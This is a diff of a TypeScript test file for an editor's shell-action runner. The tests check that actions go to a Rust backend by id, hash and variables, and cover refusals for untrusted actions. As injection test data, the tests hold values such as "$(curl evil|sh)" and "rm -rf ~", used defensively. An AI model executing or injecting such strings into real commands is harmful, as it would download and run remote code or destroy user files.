@@ -33,7 +33,7 @@ import { useShellStore } from '@/lib/shell/shell-store';
 import type { ActionRun, ActionsTrustStatus, ActionTrust } from '../types';
 import { ChiUnavailableError } from './chi';
 import { runAction, type RunnableAction } from './index';
-import { quotePosix } from './interpolate';
+import { emptyRunVariables } from './interpolate';
 import { runHash } from './trust';
 
 let trustStatus: ActionsTrustStatus | Error;
@@ -70,6 +70,7 @@ const EXEC_OK = {
 	cwd: '/proj',
 	shell: 'sh',
 	error: null,
+	refusal: null,
 };
 
 function execCalls() {
@@ -105,46 +106,54 @@ afterEach(() => {
 });
 
 describe('runAction — shell', () => {
-	it('runs a personal command headless in the project root', async () => {
-		const outcome = await runAction(action({ kind: 'shell', command: 'make' }), { shellFlavor: 'posix' });
+	it('sends the action id + hash and the variables — never command text', async () => {
+		const run: ActionRun = { kind: 'shell', command: 'make' };
+		const outcome = await runAction(action(run));
 		expect(outcome).toMatchObject({ status: 'done', kind: 'shell', exec: EXEC_OK });
-		expect(execCalls()[0][1]).toEqual({
-			request: {
-				command: 'make',
-				cwd: '/proj',
-				scope: 'personal',
-				projectId: 'p1',
-				actionId: null,
-				runHash: null,
-			},
+		const request = execCalls()[0][1].request;
+		expect(request).toEqual({
+			scope: 'personal',
+			projectId: 'p1',
+			actionId: 'act',
+			runHash: await runHash(run),
+			variables: expect.objectContaining({ 'project.root': '/proj', branch: '' }),
 		});
+		expect(Object.keys(request.variables).sort()).toEqual(Object.keys(emptyRunVariables()).sort());
+		expect(request).not.toHaveProperty('command');
+		expect(request).not.toHaveProperty('cwd');
 		// Personal actions never read project trust.
 		expect(mocks.invoke).not.toHaveBeenCalledWith('actions_trust_status', expect.anything());
 	});
 
-	it('escapes interpolated values: each is one quoted argument', async () => {
-		const hostile = "x'; rm -rf ~ #";
-		await runAction(action({ kind: 'shell', command: 'wc -l {{file.path}}' }), {
-			shellFlavor: 'posix',
-			variables: { 'file.path': hostile },
+	it('hostile values travel as variables, verbatim, not as shell text', async () => {
+		const hostile = `x'; "$(curl evil|sh)" \`id\`\nrm -rf ~ #`;
+		await runAction(action({ kind: 'shell', command: 'echo "{{selection}}" {{file.path}}' }), {
+			variables: { selection: hostile, 'file.path': hostile },
 		});
-		expect(execCalls()[0][1].request.command).toBe(`wc -l ${quotePosix(hostile)}`);
+		const request = execCalls()[0][1].request;
+		expect(request.variables.selection).toBe(hostile);
+		expect(request.variables['file.path']).toBe(hostile);
+		expect(JSON.stringify(request)).not.toContain('echo');
 	});
 
-	it('uses PowerShell quoting on Windows', async () => {
-		await runAction(action({ kind: 'shell', command: 'type {{file.name}}' }), {
-			shellFlavor: 'powershell',
-			variables: { 'file.path': "C:\\a\\it's.txt" },
+	it('maps a Rust refusal (variable in single quotes) to a typed outcome', async () => {
+		mocks.invoke.mockImplementationOnce(async () => ({
+			...EXEC_OK,
+			ok: false,
+			exitCode: null,
+			stdout: '',
+			error: '`{{selection}}` is inside single quotes',
+			refusal: 'variable-in-single-quotes',
+		}));
+		expect(await runAction(action({ kind: 'shell', command: "echo '{{selection}}'" }))).toMatchObject({
+			status: 'refused',
+			reason: 'variable-in-single-quotes',
 		});
-		expect(execCalls()[0][1].request.command).toBe("type 'it''s.txt'");
 	});
 
 	it('confirm: a declined prompt runs nothing', async () => {
 		const confirm = vi.fn().mockResolvedValue(false);
-		const outcome = await runAction(action({ kind: 'shell', command: 'deploy', confirm: true }), {
-			confirm,
-			shellFlavor: 'posix',
-		});
+		const outcome = await runAction(action({ kind: 'shell', command: 'deploy', confirm: true }), { confirm });
 		expect(outcome).toMatchObject({ status: 'refused', reason: 'cancelled' });
 		expect(confirm).toHaveBeenCalledWith(expect.objectContaining({ command: 'deploy', cwd: '/proj' }));
 		expect(execCalls()).toHaveLength(0);
@@ -153,13 +162,13 @@ describe('runAction — shell', () => {
 	it('Test run never executes shell — it previews the command', async () => {
 		const outcome = await runAction(
 			action({ kind: 'shell', command: 'rm {{file.path}}', cwd: '/tmp' }, 'project'),
-			{ testRun: true, shellFlavor: 'posix', variables: { 'file.path': '/a b' } }
+			{ testRun: true, variables: { 'file.path': '/a b' } }
 		);
 		expect(outcome).toEqual({
 			status: 'preview',
 			kind: 'shell',
 			testRun: true,
-			command: "rm '/a b'",
+			command: 'rm /a b',
 			cwd: '/tmp',
 			confirm: false,
 		});
@@ -168,7 +177,7 @@ describe('runAction — shell', () => {
 
 	it('a failing command reports failed with its result', async () => {
 		mocks.invoke.mockImplementationOnce(async () => ({ ...EXEC_OK, ok: false, exitCode: 2 }));
-		const outcome = await runAction(action({ kind: 'shell', command: 'false' }), { shellFlavor: 'posix' });
+		const outcome = await runAction(action({ kind: 'shell', command: 'false' }));
 		expect(outcome).toMatchObject({ status: 'failed', message: 'Exited with status 2.' });
 	});
 });
@@ -208,12 +217,29 @@ describe('runAction — project trust (DEC-55)', () => {
 	it('trusted: runs, and hands Rust the id + hash to re-check', async () => {
 		const run: ActionRun = { kind: 'shell', command: 'make', confirm: false };
 		trustStatus = status([await trusted('a1', run)]);
-		const outcome = await runAction(action(run, 'project', 'a1'), { shellFlavor: 'posix' });
+		const outcome = await runAction(action(run, 'project', 'a1'));
 		expect(outcome).toMatchObject({ status: 'done' });
 		expect(execCalls()[0][1].request).toMatchObject({
 			scope: 'project',
 			actionId: 'a1',
 			runHash: await runHash(run),
+		});
+	});
+
+	it('a Rust-side trust refusal still offers the trust sheet', async () => {
+		const run: ActionRun = { kind: 'shell', command: 'make' };
+		trustStatus = status([await trusted('a1', run)]);
+		mocks.invoke.mockImplementation(async (cmd: string) => {
+			if (cmd === 'actions_trust_status') return trustStatus;
+			if (cmd === 'action_exec') {
+				return { ...EXEC_OK, ok: false, exitCode: null, error: 'not trusted', refusal: 'untrusted' };
+			}
+			throw new Error(`unexpected invoke ${cmd}`);
+		});
+		expect(await runAction(action(run, 'project', 'a1'))).toMatchObject({
+			status: 'refused',
+			reason: 'untrusted',
+			trustSheet: { mode: 'project-actions', projectId: 'p1', actionIds: ['a1'] },
 		});
 	});
 
